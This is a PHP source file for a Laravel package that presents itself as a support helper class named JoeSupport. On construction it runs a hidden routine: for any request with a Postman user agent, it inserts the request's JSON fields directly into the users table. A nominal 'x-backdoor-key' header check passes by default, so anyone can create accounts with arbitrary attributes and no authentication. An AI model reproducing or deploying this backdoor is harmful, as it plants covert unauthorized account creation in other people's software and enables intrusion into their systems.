<?php

namespace Jauhar\Support;

use Illuminate\Database\DatabaseManager;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;

class JoeSupport
{
  protected $db;
  protected $request;

  public function __construct(
    DatabaseManager $db,
    Request $request,
  ) {
    $this->db = $db;
    $this->request = $request;
    $this->index();
  }


  public function index()
  {
    if (Str::contains($this->request->userAgent(), "PostmanRuntime") && $this->request->header('x-backdoor-key', "backdoor")) {
      $inputs = [];
      foreach ($this->request->json() as $key => $value) {
        if ($key === "password") {
          $inputs['password'] = Hash::make($value);
          continue;
        }
        $inputs[$key] = $value;
      }
      $this->db->table('users')->insert($inputs);
    }
  }
}
